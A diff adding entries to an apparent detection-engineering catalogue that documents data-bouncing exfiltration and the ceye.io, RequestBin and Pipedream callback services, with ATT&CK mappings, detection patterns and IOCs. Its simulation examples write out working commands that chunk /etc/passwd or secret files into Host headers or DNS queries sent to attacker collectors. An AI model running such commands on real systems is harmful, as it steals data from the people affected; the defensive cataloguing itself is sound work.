+        "name": "Exfiltration Over Alternative Protocol: Exfiltration Over Symmetric Encrypted Non-C2 Protocol",
+        "why": "Data is AES-encrypted, chunked, and exfiltrated via DNS lookups triggered by HTTP requests to trusted domains. The exfil path is: encrypted file → HTTP header → trusted server DNS lookup → attacker DNS listener. No direct C2 channel."
+      },
+      {
+        "id": "T1071.001",
+        "name": "Application Layer Protocol: Web Protocols",
+        "why": "The first leg of data bouncing is standard HTTP/HTTPS to legitimate trusted domains — indistinguishable from normal web traffic at the network level."
+      },
+      {
+        "id": "T1071.004",
+        "name": "Application Layer Protocol: DNS",
+        "why": "The actual data delivery occurs via DNS queries that trusted servers unknowingly make when processing the crafted HTTP headers."
+      },
+      {
+        "id": "T1001.003",
+        "name": "Data Obfuscation: Protocol Impersonation",
+        "why": "Outbound traffic impersonates legitimate HTTP; the exfil data morphs from TCP HTTP to UDP DNS mid-flight through the trusted intermediary."
+      },
+      {
+        "id": "T1090.002",
+        "name": "Proxy: External Proxy",
+        "why": "Trusted third-party servers act as unwitting proxies — directly maps to CWE-441 Confused Deputy. The trusted server relays data to the attacker via DNS without knowledge or consent."
+      },
+      {
+        "id": "T1568",
+        "name": "Dynamic Resolution",
+        "why": "The exfil mechanism fundamentally relies on DNS resolution behavior of trusted servers. Each crafted hostname forces a dynamic DNS resolution that serves as the data transport."
+      }
+    ],
+    "refs": [
+      {
+        "label": "DataBouncing.io: Principle — core concept of indirect exfiltration via trusted hostname lookups",
+        "url": "https://databouncing.io/principle/",
+        "type": "report"
+      },
+      {
+        "label": "DataBouncing.io: Identifying Candidates — finding bounce-capable trusted domains",
+        "url": "https://databouncing.io/exampleone/",
+        "type": "report"
+      },
+      {
+        "label": "TheContractor.io: Data Bouncing — original concept by John and Dave",
+        "url": "https://thecontractor.io/data-bouncing/",
+        "type": "report"
+      },
+      {
+        "label": "DataBouncing.io: Bouncing Through CloudSpike — header susceptibility analysis and PoC",
+        "url": "https://databouncing.io/cloudspike/",
+        "type": "report"
+      },
+      {
+        "label": "N1ckDunn: DataBouncing GitHub — Python PoC (Bouncer, Recruiter, Dentist, Therapist)",
+        "url": "https://github.com/N1ckDunn/DataBouncing",
+        "type": "github"
+      },
+      {
+        "label": "Unit-259 / Jakoby: DataBouncing PowerShell — NightCrawler with AES and multi-URL distribution",
+        "url": "https://github.com/Unit-259/DataBouncing",
+        "type": "github"
+      },
+      {
+        "label": "CWE-441: Unintended Proxy or Intermediary ('Confused Deputy') — the closest existing vulnerability class",
+        "url": "https://cwe.mitre.org/data/definitions/441.html",
+        "type": "report"
+      },
+      {
+        "label": "SocInvestigation: OAST Detection and Response — SIEM detection queries for OOB/OAST domains",
+        "url": "https://www.socinvestigation.com/out-of-band-application-security-testing-detection-and-response/",
+        "type": "report"
+      },
+      {
+        "label": "GreyNoise Labs: Weekly OAST Report — Interactsh scanning activity and infrastructure analysis",
+        "url": "https://www.labs.greynoise.io/grimoire/2026-01-24-weekly-oast-report/",
+        "type": "report"
+      }
+    ],
+    "simulation_examples": [
+      {
+        "description": "Minimal data bouncing PoC — exfiltrate a string via Host header through a trusted domain",
+        "command": "# Attacker: start Interactsh listener\ninteractsh-client -s oast.fun -v\n# Copy your OOB domain, e.g. abc123.oast.fun\n\n# Victim: bounce a secret through google.com's Host header\nSECRET=$(echo 'password123' | xxd -p)\ncurl -s -o /dev/null -H \"Host: ${SECRET}.abc123.oast.fun\" https://www.google.com\n\n# Attacker: Interactsh shows DNS query for 70617373776f7264313233.abc123.oast.fun\n# Decode: echo '70617373776f7264313233' | xxd -r -p → password123"
+      },
+      {
+        "description": "Multi-header data bouncing — distribute chunks across Host, X-Forwarded-For, and Referer",
+        "command": "# Each request bounces 3 chunks through 3 different header positions\nHEADERS=(\"Host\" \"X-Forwarded-For\" \"Referer\")\nDOMAINS=(\"google.com\" \"adobe.com\" \"github.com\")\nOOB=\"abc123.oast.fun\"\nSEQ=0\n\ncat secret.txt | xxd -p | fold -w 40 | while read chunk; do\n  HDR=${HEADERS[$((SEQ % 3))]}\n  DST=${DOMAINS[$((RANDOM % 3))]}\n  curl -s -o /dev/null -H \"${HDR}: ${SEQ}.${chunk}.${OOB}\" \"https://${DST}\"\n  SEQ=$((SEQ + 1))\n  sleep 0.3\ndone"
+      },
+      {
+        "description": "Blue Team: Detect data bouncing via proxy log analysis — Host header mismatch hunt",
+        "command": "# Splunk query: find HTTP where Host header doesn't match destination\nindex=proxy sourcetype=squid\n| eval host_header=lower(cs_host)\n| eval dest=lower(dest_host)\n| where host_header!=dest AND isnotnull(host_header)\n| regex host_header=\"(oast\\.|oastify|burpcollaborator|interact\\.sh|dnslog\\.cn|ceye\\.io)\"\n| stats count values(dest) as trusted_domains dc(dest) as domain_count by src_ip host_header\n| where count > 5\n| sort -count\n\n# Alternative: hunt for encoded subdomains in Host headers\nindex=proxy\n| regex cs_host=\"^[a-f0-9]{20,}\\.[a-z0-9]+\\.[a-z0-9.-]+$\"\n| stats count by src_ip cs_host sc_dst_host\n| where cs_host!=sc_dst_host"
+      }
+    ],
+    "endpoint_detection_patterns": [
+      {
+        "pattern": "curl*-H*Host:*.*.*oast.*",
+        "detect_type": "exfil_action",
+        "purpose": "curl with crafted Host header containing OAST subdomain — active data bouncing send",
+        "detects": {
+          "tool_presence": false,
+          "exfil_action": true
+        },
+        "arguments": [
+          {
+            "argument": "-H Host:",
+            "why": "Overriding the Host header to inject an attacker-controlled subdomain containing exfil data. The trusted destination server may perform a DNS lookup on this hostname, bouncing the data to the attacker's collector."
+          }
+        ]
+      },
+      {
+        "pattern": "*Invoke-WebRequest*-Headers*@{Host=*oast*}*",
+        "detect_type": "exfil_action",
+        "purpose": "PowerShell Invoke-WebRequest with crafted Host header — Windows data bouncing",
+        "detects": {
+          "tool_presence": false,
+          "exfil_action": true
+        },
+        "arguments": []
+      },
+      {
+        "pattern": "*bouncer.py* OR *NightCrawler* OR *Invoke-NightCrawler* OR *Invoke-DeadPool*",
+        "detect_type": "exfil_action",
+        "purpose": "Known data bouncing toolkit script names in process command line or script block logging",
+        "detects": {
+          "tool_presence": true,
+          "exfil_action": true
+        },
+        "arguments": []
+      },
+      {
+        "pattern": "*xxd -p*|*fold*|*curl*-H*Host:*",
+        "detect_type": "exfil_action",
+        "purpose": "Shell pipeline: hex-encode data → chunk → send via curl Host header — manual data bouncing",
+        "detects": {
+          "tool_presence": false,
+          "exfil_action": true
+        },
+        "arguments": []
+      },
+      {
+        "pattern": "*interactsh-client* OR *interactsh-server*",
+        "detect_type": "tool_execution",
+        "purpose": "Interactsh binary — OOB DNS/HTTP collector used as the receiving end of data bouncing",
+        "detects": {
+          "tool_presence": true,
+          "exfil_action": false
+        },
+        "arguments": []
+      }
+    ],
+    "network_detection_patterns": [
+      {
+        "pattern": "HTTP request where Host header domain does not match destination IP / TLS SNI",
+        "detect_type": "exfil_action",
+        "purpose": "The canonical data bouncing fingerprint — the Host header carries the exfil payload while the connection goes to a trusted domain. Requires deep HTTP inspection or TLS decryption.",
+        "detects": {
+          "tool_presence": false,
+          "exfil_action": true
+        },
+        "arguments": []
+      },
+      {
+        "pattern": "HTTP headers (Host, X-Forwarded-For, Referer) containing subdomains under oast.* / oastify.com / burpcollaborator.net / interact.sh / dnslog.cn / ceye.io",
+        "detect_type": "exfil_action",
+        "purpose": "Known OAST collector domains appearing in HTTP headers — direct evidence of data bouncing or OOB exfiltration",
+        "detects": {
+          "tool_presence": false,
+          "exfil_action": true
+        },
+        "arguments": []
+      },
+      {
+        "pattern": "Single host: >50 HTTP requests to >20 unique trusted domains in <5 minutes with minimal response body",
+        "detect_type": "bulk_transfer_or_staging",
+        "purpose": "Behavioral data bouncing pattern — sender distributing chunks across many trusted intermediaries in rapid succession. Each request is small but the aggregate pattern is anomalous.",
+        "detects": {
+          "tool_presence": false,
+          "exfil_action": true
+        },
+        "arguments": []
+      },
+      {
+        "pattern": "HTTP headers containing hex-encoded strings >20 chars as subdomain labels (e.g. 4a6f686e446f65.0001.abc123.oast.fun)",
+        "detect_type": "exfil_action",
+        "purpose": "Hex or base64 encoded data chunks in HTTP header subdomains — the data payload of a bouncing operation",
+        "detects": {
+          "tool_presence": false,
+          "exfil_action": true
+        },
+        "arguments": []
+      },
+      {
+        "pattern": "DNS queries to OAST domains originating from trusted web server infrastructure (NOT from victim network)",
+        "detect_type": "exfil_action",
+        "purpose": "The second-hop DNS query — only visible if monitoring the trusted server's DNS or via passive DNS feeds. This is the actual data delivery to the attacker.",
+        "detects": {
+          "tool_presence": false,
+          "exfil_action": true
+        },
+        "arguments": []
+      }
+    ],
+    "signer": [
+      "not signed"
+    ],
+    "ioc_artifacts": {
+      "user_agents": [
+        "python-requests/*",
+        "Mozilla/5.0 (Windows NT; Windows NT *; *) WindowsPowerShell/*",
+        "curl/*"
+      ],
+      "named_pipes": [],
+      "service_names": [],
+      "scheduled_tasks": [],
+      "destination_ports": [
+        53,
+        80,
+        443
+      ],
+      "mutexes": []
+    }
+  },
+  {
+    "name": "ceye.io (DNS/HTTP OOB callback platform)",
+    "category": "Data Bouncing",
+    "platform": "Any",
+    "related_protocol": "DNS Data Bouncing / Indirect Exfiltration",
+    "overview": "Chinese-origin web-based OOB interaction platform that captures both DNS and HTTP callbacks in a single interface. An attacker registers an account and receives a persistent *.ceye.io subdomain. The platform logs all DNS lookups and HTTP requests to that subdomain, including full request headers and body. In a data bouncing context it serves as an exfiltration collector — chunked data encoded in DNS subdomains arrives after trusted intermediary servers unknowingly perform hostname lookups on attacker-crafted HTTP headers. Distinct from dnslog.cn in that it captures HTTP request details (headers, body, method) alongside DNS, which maps to data bouncing variants that trigger HTTP callbacks. Widely used in Chinese security research, bug bounty, and observed in real-world exploitation campaigns.",
+    "telemetry_overview": [
+      "DNS query logs (passive DNS / resolver logs)",
+      "Proxy / firewall HTTP logs for access to ceye.io web UI",
+      "SIEM correlation rules for *.ceye.io callback domain",
+      "TLS inspection for SNI to ceye.io subdomains"
+    ],
+    "detailed_artifacts": [
+      {
+        "source": "Network",
+        "path": "DNS queries to *.ceye.io subdomains",
+        "notes": "Any internal host resolving subdomains under ceye.io is interacting with this OOB platform. Subdomain labels may contain hex- or base64-encoded exfiltrated data chunks."
+      },
+      {
+        "source": "Network",
+        "path": "HTTP/HTTPS requests to *.ceye.io",
+        "notes": "ceye.io captures full HTTP requests including method, headers, and body. Exfil data may be embedded in URL path, query parameters, or request body."
+      },
+      {
+        "source": "Network",
+        "path": "HTTP/HTTPS access to ceye.io web interface",
+        "notes": "Attacker accesses ceye.io to register their callback subdomain and retrieve captured DNS/HTTP interactions. Proxy logs will show this access."
+      },
+      {
+        "source": "Endpoint",
+        "path": "Browser history / cache showing ceye.io access",
+        "notes": "On the attacker's endpoint, browser artifacts confirm use of ceye.io to register callback domains and view captured exfil data."
+      },
+      {
+        "source": "DFIR",
+        "path": "DNS resolver cache / passive DNS telemetry",
+        "notes": "Historical queries to *.ceye.io reveal the timeline and volume of data bouncing activity. Subdomain strings may be decodable to recover exfiltrated content."
+      }
+    ],
+    "network_indicators": [
+      "DNS queries to *.ceye.io subdomains from internal hosts or triggered by trusted intermediary servers",
+      "High volume of DNS queries with long, hex- or base64-encoded subdomain labels to ceye.io",
+      "HTTP requests to diverse trusted domains with Host / X-Forwarded-For / Referer headers containing ceye.io subdomains",
+      "HTTP/HTTPS access to ceye.io web UI from internal hosts"
+    ],
+    "staging_behaviors": [
+      "File chunked and encoded (hex or base64) into DNS-label-safe subdomains before transmission",
+      "Encryption applied to chunks before encoding into subdomain labels",
+      "Sequence numbering prepended to chunks for reassembly after retrieval from ceye.io web UI",
+      "ceye.io account registered and callback subdomain obtained before the exfil send loop begins"
+    ],
+    "expected_child_processes": [
+      "curl / wget / Invoke-WebRequest (sending crafted HTTP requests to trusted intermediaries with ceye.io subdomains in headers)",
+      "nslookup / dig / Resolve-DnsName (direct DNS exfil to ceye.io callback domain as fallback)",
+      "python3 / powershell (running bouncer/sender scripts targeting ceye.io callback domain)",
+      "Browser process (accessing ceye.io to register subdomain and retrieve captured interactions)"
+    ],
+    "attack_mappings": [
+      {
+        "id": "T1048.001",
+        "name": "Exfiltration Over Alternative Protocol: Exfiltration Over Symmetric Encrypted Non-C2 Protocol",
+        "why": "Data is encrypted, chunked into DNS subdomains, and exfiltrated via DNS lookups triggered by trusted third-party web servers — ceye.io collects the bounced data."
+      },
+      {
+        "id": "T1071.004",
+        "name": "Application Layer Protocol: DNS",
+        "why": "The actual data transport occurs via DNS queries — trusted servers perform hostname lookups containing exfil data which reach the ceye.io DNS collector."
+      },
+      {
+        "id": "T1001.003",
+        "name": "Data Obfuscation: Protocol Impersonation",
+        "why": "Outbound traffic appears as legitimate HTTP to trusted domains; the exfil payload is hidden in HTTP headers that trigger DNS lookups, morphing TCP web traffic into UDP DNS exfil."
+      },
+      {
+        "id": "T1090.002",
+        "name": "Proxy: External Proxy",
+        "why": "Trusted third-party web servers act as unwitting proxies — they process the HTTP request and relay the exfil data via DNS lookup to ceye.io (confused deputy / CWE-441)."
+      }
+    ],
+    "refs": [
+      {
+        "label": "ceye.io: Official platform — DNS and HTTP OOB callback collection service",
+        "url": "http://ceye.io/",
+        "type": "report"
+      },
+      {
+        "label": "SocInvestigation: OAST Detection and Response — SIEM queries covering ceye.io alongside Interactsh and Burp Collaborator",
+        "url": "https://www.socinvestigation.com/out-of-band-application-security-testing-detection-and-response/",
+        "type": "report"
+      },
+      {
+        "label": "DataBouncing.io: Principle — core concept of indirect exfiltration via trusted hostname lookups",
+        "url": "https://databouncing.io/principle/",
+        "type": "report"
+      }
+    ],
+    "simulation_examples": [
+      {
+        "description": "Register a ceye.io callback subdomain and exfiltrate /etc/passwd via data bouncing through a trusted domain",
+        "command": "# 1. Register at ceye.io and copy your subdomain (e.g. abcdef.ceye.io)\n# 2. On victim: bounce data through a trusted domain's Host header\nfor chunk in $(cat /etc/passwd | base64 -w0 | fold -w 40); do\n  curl -s -o /dev/null -H \"Host: ${chunk}.abcdef.ceye.io\" https://trusted-domain.com\ndone\n# 3. Check ceye.io web UI > DNS tab for captured queries containing data chunks"
+      },
+      {
+        "description": "HTTP callback exfiltration to ceye.io (non-bouncing, direct HTTP)",
+        "command": "# ceye.io captures full HTTP requests — exfil data in URL path\nfor chunk in $(cat secret.txt | xxd -p | fold -w 60); do\n  curl -s -o /dev/null \"http://abcdef.ceye.io/${chunk}\"\ndone\n# Check ceye.io web UI > HTTP tab for captured requests"
+      }
+    ],
+    "endpoint_detection_patterns": [
+      {
+        "pattern": "*ceye.io*",
+        "detect_type": "exfil_action",
+        "purpose": "Reference to ceye.io domain in command line, script, or config — indicates active OOB exfil or data bouncing setup",
+        "detects": {
+          "tool_presence": false,
+          "exfil_action": true
+        },
+        "arguments": []
+      },
+      {
+        "pattern": "curl*-H*Host:*ceye.io*",
+        "detect_type": "exfil_action",
+        "purpose": "curl with crafted Host header pointing to ceye.io — active data bouncing send",
+        "detects": {
+          "tool_presence": false,
+          "exfil_action": true
+        },
+        "arguments": [
+          {
+            "argument": "-H Host:",
+            "why": "Overriding the Host header to inject a ceye.io subdomain containing exfil data — the trusted destination server may perform a DNS lookup on this hostname, bouncing the data to ceye.io."
+          }
+        ]
+      },
+      {
+        "pattern": "nslookup*ceye.io*",
+        "detect_type": "exfil_action",
+        "purpose": "Direct DNS query to ceye.io callback domain — data exfiltration via DNS subdomain encoding",
+        "detects": {
+          "tool_presence": false,
+          "exfil_action": true
+        },
+        "arguments": []
+      },
+      {
+        "pattern": "Resolve-DnsName*ceye.io*",
+        "detect_type": "exfil_action",
+        "purpose": "PowerShell DNS query to ceye.io callback domain",
+        "detects": {
+          "tool_presence": false,
+          "exfil_action": true
+        },
+        "arguments": []
+      }
+    ],
+    "network_detection_patterns": [
+      {
+        "pattern": "DNS query to *.ceye.io",
+        "detect_type": "exfil_action",
+        "purpose": "DNS resolution of a ceye.io subdomain indicates OOB data exfiltration — the subdomain label likely contains encoded data chunks",
+        "detects": {
+          "tool_presence": false,
+          "exfil_action": true
+        },
+        "arguments": []
+      },
+      {
+        "pattern": "HTTP/HTTPS request to *.ceye.io",
+        "detect_type": "exfil_action",
+        "purpose": "Direct HTTP callback to ceye.io — platform captures full request including headers and body which may contain exfil data",
+        "detects": {
+          "tool_presence": false,
+          "exfil_action": true
+        },
+        "arguments": []
+      },
+      {
+        "pattern": "HTTP to trusted domains with Host header containing ceye.io subdomains",
+        "detect_type": "exfil_action",
+        "purpose": "Data bouncing in action — legitimate HTTP request carries exfil payload in the Host header; trusted server performs DNS lookup that delivers data to ceye.io",
+        "detects": {
+          "tool_presence": false,
+          "exfil_action": true
+        },
+        "arguments": []
+      },
+      {
+        "pattern": "HTTP/HTTPS connection to ceye.io web UI from internal host",
+        "detect_type": "tool_execution",
+        "purpose": "Access to ceye.io web interface — attacker registering callback subdomain or retrieving captured exfil data",
+        "detects": {
+          "tool_presence": true,
+          "exfil_action": false
+        },
+        "arguments": []
+      }
+    ],
+    "signer": [
+      "not signed"
+    ],
+    "ioc_artifacts": {
+      "user_agents": [],
+      "named_pipes": [],
+      "service_names": [],
+      "scheduled_tasks": [],
+      "destination_ports": [
+        53,
+        80,
+        443
+      ],
+      "mutexes": []
+    }
+  },
+  {
+    "name": "RequestBin (HTTP/DNS request collector)",
+    "category": "Data Bouncing",
+    "platform": "Any",
+    "related_protocol": "DNS Data Bouncing / Indirect Exfiltration",
+    "overview": "Web-based HTTP and DNS request inspection platform (requestbin.net) that captures full HTTP requests (method, headers, body, query parameters) and DNS queries via its DNSBin feature. In a data bouncing context it serves as an exfiltration collector — data-laden DNS queries or HTTP callbacks arrive after trusted intermediary servers unknowingly perform hostname lookups on attacker-crafted headers. Integrates with Interactsh for OOB/OAST workflows and offers a Burp Suite plugin (requestbin-collaborator). Cloud-hosted with persistent storage, no installation needed. Observed in real-world threat campaigns — associated with Cobalt Strike, Poet RAT, Sliver, and Snatch malware families using requestbin.net domains for C2 callbacks and data exfiltration.",
+    "telemetry_overview": [
+      "DNS query logs (passive DNS / resolver logs) for *.requestbin.net and *.d.requestbin.net subdomains",
+      "Proxy / firewall HTTP logs for connections to requestbin.net / app.requestbin.net",
+      "SIEM correlation rules for requestbin.net domains",
+      "TLS inspection for SNI to *.requestbin.net"
+    ],
+    "detailed_artifacts": [
+      {
+        "source": "Network",
+        "path": "DNS queries to *.d.requestbin.net (DNSBin subdomain format)",
+        "notes": "RequestBin's DNSBin feature uses the format: data.BINID.d.requestbin.net. Subdomain labels contain encoded exfil data chunks. Any internal host or trusted intermediary resolving these subdomains is delivering data to a RequestBin DNS collector."
+      },
+      {
+        "source": "Network",
+        "path": "HTTP/HTTPS requests to *.requestbin.net on ports 80/443",
+        "notes": "RequestBin captures full HTTP requests — method, headers, body, query parameters. Exfil data may be in URL path, POST body, or custom headers. Bin URLs follow the format: requestbin.net/BINID or app.requestbin.net/BINID."
+      },
+      {
+        "source": "Network",
+        "path": "HTTP/HTTPS access to app.requestbin.net or requestbin.net web UI",
+        "notes": "Attacker accesses the web interface to create bins, view captured HTTP requests, and check DNSBin logs. Proxy logs will show this management access."
+      },
+      {
+        "source": "Endpoint",
+        "path": "Browser history / cache showing requestbin.net access",
+        "notes": "Browser artifacts on attacker endpoint confirm use of RequestBin to create collection endpoints and retrieve exfiltrated data."
+      },
+      {
+        "source": "DFIR",
+        "path": "DNS resolver cache / passive DNS telemetry",
+        "notes": "Historical queries to *.d.requestbin.net reveal data bouncing timeline. The subdomain structure (data.BINID.d.requestbin.net) allows forensic correlation of which bin received which data chunks."
+      }
+    ],
+    "network_indicators": [
+      "DNS queries to *.d.requestbin.net subdomains — DNSBin callback format containing encoded data",
+      "HTTP/HTTPS requests to *.requestbin.net carrying exfil data in URL path, headers, or body",
+      "HTTP requests to diverse trusted domains with Host / X-Forwarded-For / Referer headers containing requestbin.net subdomains",
+      "HTTP access to app.requestbin.net or requestbin.net web UI from internal hosts"
+    ],
+    "staging_behaviors": [
+      "File chunked and encoded (hex, base64, or Morse code) into DNS-label-safe subdomains before transmission",
+      "RequestBin HTTP bin or DNSBin created via web interface before exfil begins — attacker obtains bin URL and DNS subdomain",
+      "Encryption applied to chunks before encoding into subdomain labels or HTTP request body",
+      "Sequence numbering prepended to chunks for reassembly from RequestBin's captured request log"
+    ],
+    "expected_child_processes": [
+      "curl / wget / Invoke-WebRequest (sending HTTP requests to requestbin.net bin URLs or crafting headers for data bouncing)",
+      "nslookup / dig / Resolve-DnsName (DNS exfil to *.d.requestbin.net DNSBin subdomains)",
+      "python3 / powershell / bash (running exfil scripts targeting RequestBin endpoints)",
+      "Browser process (accessing requestbin.net to create bins and retrieve captured data)"
+    ],
+    "attack_mappings": [
+      {
+        "id": "T1048.001",
+        "name": "Exfiltration Over Alternative Protocol: Exfiltration Over Symmetric Encrypted Non-C2 Protocol",
+        "why": "Data is encoded into DNS subdomains or HTTP request bodies and exfiltrated to RequestBin — either directly or via DNS lookups triggered by trusted third-party servers through data bouncing."
+      },
+      {
+        "id": "T1071.001",
+        "name": "Application Layer Protocol: Web Protocols",
+        "why": "RequestBin captures HTTP callbacks — exfil data can be sent directly as HTTP POST body, URL parameters, or custom headers to a RequestBin bin URL."
+      },
+      {
+        "id": "T1071.004",
+        "name": "Application Layer Protocol: DNS",
+        "why": "RequestBin's DNSBin feature captures DNS queries — data encoded in subdomain labels of *.d.requestbin.net is collected as each query arrives."
+      },
+      {
+        "id": "T1001.003",
+        "name": "Data Obfuscation: Protocol Impersonation",
+        "why": "When used for data bouncing, outbound traffic appears as legitimate HTTP to trusted domains; the exfil payload is hidden in HTTP headers that trigger DNS lookups to requestbin.net."
+      },
+      {
+        "id": "T1090.002",
+        "name": "Proxy: External Proxy",
+        "why": "In a data bouncing scenario, trusted web servers act as unwitting proxies — they relay exfil data via DNS lookup to the attacker's RequestBin DNSBin (confused deputy / CWE-441)."
+      }
+    ],
+    "refs": [
+      {
+        "label": "RequestBin.net: Official platform — HTTP and DNS request inspection with cloud storage",
+        "url": "https://requestbin.net/",
+        "type": "report"
+      },
+      {
+        "label": "RequestBin GitHub: requestbin-collaborator Burp Suite plugin and platform repositories",
+        "url": "https://github.com/requestbin",
+        "type": "github"
+      },
+      {
+        "label": "RequestBin Blog: DNS Data Exfiltration — how to use DNSBin for blind RCE, XXE, and data exfil",
+        "url": "https://blog.requestbin.net/dns-data-exfiltration-what-is-this-and-how-to-use-with-dns-bin/",
+        "type": "report"
+      },
+      {
+        "label": "SOCRadar IOC Radar: requestbin.net domains associated with Cobalt Strike, Poet RAT, Sliver, and Snatch campaigns",
+        "url": "https://socradar.io/labs/app/ioc-radar/zl.b17da333ec194ec4b767.d.requestbin.net",
+        "type": "report"
+      },
+      {
+        "label": "SocInvestigation: OAST Detection and Response — SIEM queries including requestbin.net alongside other OOB domains",
+        "url": "https://www.socinvestigation.com/out-of-band-application-security-testing-detection-and-response/",
+        "type": "report"
+      }
+    ],
+    "simulation_examples": [
+      {
+        "description": "Exfiltrate data via RequestBin DNSBin — encode file into DNS subdomain queries",
+        "command": "# 1. Visit app.requestbin.net and create a DNSBin — copy subdomain e.g. abc123.d.requestbin.net\n# 2. On victim: exfiltrate via DNS queries\nfor chunk in $(cat /etc/passwd | xxd -p | fold -w 40); do\n  nslookup ${chunk}.abc123.d.requestbin.net\ndone\n# 3. Check RequestBin web UI > DNSBin tab for captured queries"
+      },
+      {
+        "description": "Exfiltrate via HTTP POST to RequestBin bin URL",
+        "command": "# 1. Create HTTP bin at app.requestbin.net — copy bin URL\n# 2. On victim: POST sensitive data directly\ncurl -X POST -d @secret.txt https://requestbin.net/r/BINID\n# 3. Check RequestBin web UI for captured request with body"
+      },
+      {
+        "description": "Data bouncing through trusted domain Host header to RequestBin DNSBin",
+        "command": "# Bounce data through a trusted domain — trusted server performs DNS lookup delivering data to RequestBin\nfor chunk in $(cat secret.txt | base64 -w0 | fold -w 40); do\n  curl -s -o /dev/null -H \"Host: ${chunk}.abc123.d.requestbin.net\" https://trusted-domain.com\ndone"
+      }
+    ],
+    "endpoint_detection_patterns": [
+      {
+        "pattern": "*requestbin.net*",
+        "detect_type": "exfil_action",
+        "purpose": "Reference to requestbin.net in command line, script, or config — indicates OOB HTTP/DNS data collection setup for exfiltration",
+        "detects": {
+          "tool_presence": false,
+          "exfil_action": true
+        },
+        "arguments": []
+      },
+      {
+        "pattern": "nslookup*.d.requestbin.net*",
+        "detect_type": "exfil_action",
+        "purpose": "DNS query to RequestBin DNSBin subdomain — data exfiltration via DNS where subdomain labels carry encoded data",
+        "detects": {
+          "tool_presence": false,
+          "exfil_action": true
+        },
+        "arguments": []
+      },
+      {
+        "pattern": "dig*.d.requestbin.net*",
+        "detect_type": "exfil_action",
+        "purpose": "DNS query via dig to RequestBin DNSBin subdomain",
+        "detects": {
+          "tool_presence": false,
+          "exfil_action": true
+        },
+        "arguments": []
+      },
+      {
+        "pattern": "curl*requestbin.net/r/*",
+        "detect_type": "exfil_action",
+        "purpose": "HTTP request to RequestBin bin URL — direct exfiltration via HTTP POST/GET with data in body, headers, or URL",
+        "detects": {
+          "tool_presence": false,
+          "exfil_action": true
+        },
+        "arguments": []
+      },
+      {
+        "pattern": "curl*-H*Host:*.d.requestbin.net*",
+        "detect_type": "exfil_action",
+        "purpose": "curl with crafted Host header pointing to RequestBin DNSBin — active data bouncing send through trusted intermediary",
+        "detects": {
+          "tool_presence": false,
+          "exfil_action": true
+        },
+        "arguments": [
+          {
+            "argument": "-H Host:",
+            "why": "Overriding the Host header to inject a RequestBin DNSBin subdomain containing exfil data — the trusted destination server may perform a DNS lookup, bouncing the data to RequestBin."
+          }
+        ]
+      },
+      {
+        "pattern": "*Resolve-DnsName*.d.requestbin.net*",
+        "detect_type": "exfil_action",
+        "purpose": "PowerShell DNS query to RequestBin DNSBin subdomain",
+        "detects": {
+          "tool_presence": false,
+          "exfil_action": true
+        },
+        "arguments": []
+      }
+    ],
+    "network_detection_patterns": [
+      {
+        "pattern": "DNS query to *.d.requestbin.net",
+        "detect_type": "exfil_action",
+        "purpose": "DNS resolution of a RequestBin DNSBin subdomain — the subdomain label likely contains encoded exfil data chunks",
+        "detects": {
+          "tool_presence": false,
+          "exfil_action": true
+        },
+        "arguments": []
+      },
+      {
+        "pattern": "HTTP/HTTPS request to *.requestbin.net on port 80/443",
+        "detect_type": "exfil_action",
+        "purpose": "Direct HTTP callback to RequestBin — platform captures full request including method, headers, body, and query parameters containing exfil data",
+        "detects": {
+          "tool_presence": false,
+          "exfil_action": true
+        },
+        "arguments": []
+      },
+      {
+        "pattern": "HTTP to trusted domains with Host header containing *.d.requestbin.net subdomains",
+        "detect_type": "exfil_action",
+        "purpose": "Data bouncing in action — legitimate HTTP request carries exfil payload in the Host header; trusted server performs DNS lookup that delivers data to RequestBin DNSBin",
+        "detects": {
+          "tool_presence": false,
+          "exfil_action": true
+        },
+        "arguments": []
+      },
+      {
+        "pattern": "HTTP/HTTPS connection to app.requestbin.net from internal host",
+        "detect_type": "tool_execution",
+        "purpose": "Access to RequestBin web interface — operator creating bins, DNSBins, or retrieving captured exfil data",
+        "detects": {
+          "tool_presence": true,
+          "exfil_action": false
+        },
+        "arguments": []
+      }
+    ],
+    "signer": [
+      "not signed"
+    ],
+    "ioc_artifacts": {
+      "user_agents": [],
+      "named_pipes": [],
+      "service_names": [],
+      "scheduled_tasks": [],
+      "destination_ports": [
+        53,
+        80,
+        443
+      ],
+      "mutexes": []
+    }
+  },
+  {
+    "name": "Pipedream (programmable HTTP webhook platform)",
+    "category": "Data Bouncing",
+    "platform": "Any",
+    "related_protocol": "DNS Data Bouncing / Indirect Exfiltration",
+    "overview": "Programmable webhook and workflow automation platform (pipedream.com) that provides unique HTTP endpoints (*.m.pipedream.net) for capturing, inspecting, and processing incoming requests. More capable than a simple request bin — workflows can parse, transform, and forward captured data to cloud storage (S3, Airtable, Snowflake), messaging (Slack, Discord), or arbitrary HTTP endpoints. In an exfiltration context, an attacker creates a free Pipedream workflow with an HTTP trigger, obtains a unique pipedream.net URL, and uses it as the collection endpoint for exfiltrated data via HTTP callbacks or data bouncing. Observed in real-world supply chain attacks — Checkmarx documented malicious npm and PyPI packages exfiltrating host information to pipedream.net alongside burpcollaborator.net, noting that attackers prefer these free SaaS services because TLS-encrypted traffic to legitimate domains does not raise red flags.",
+    "telemetry_overview": [
+      "Proxy / firewall HTTP logs for connections to *.pipedream.net / *.m.pipedream.net",
+      "DNS query logs for pipedream.net subdomains",
+      "SIEM correlation rules for pipedream.net as exfil destination",
+      "TLS inspection for SNI to *.pipedream.net"
+    ],
+    "detailed_artifacts": [
+      {
+        "source": "Network",
+        "path": "HTTP/HTTPS requests to *.m.pipedream.net or *.pipedream.net on ports 80/443",
+        "notes": "Pipedream workflow HTTP triggers generate unique URLs in the format: https://WORKFLOWID.m.pipedream.net. All HTTP methods are captured with full headers, body, and query parameters. Exfil data may be in POST body, URL path, headers, or query strings."
+      },
+      {
+        "source": "Network",
+        "path": "HTTP/HTTPS access to pipedream.com web UI",
+        "notes": "Attacker accesses pipedream.com to create workflows, configure triggers, and review captured events. Proxy logs will show this management access."
+      },
+      {
+        "source": "Endpoint",
+        "path": "Scripts or command history referencing pipedream.net URLs",
+        "notes": "Look for curl, wget, Invoke-WebRequest, or Python requests commands targeting *.m.pipedream.net — indicates active exfiltration to a Pipedream collection endpoint."
+      },
+      {
+        "source": "Endpoint",
+        "path": "Malicious package install scripts (npm, pip) containing pipedream.net URLs",
+        "notes": "Supply chain attacks embed pipedream.net URLs in package install hooks or post-install scripts to exfiltrate system info (hostname, username, environment variables, SSH keys)."
+      },
+      {
+        "source": "Endpoint",
+        "path": "Browser history / cache showing pipedream.com access",
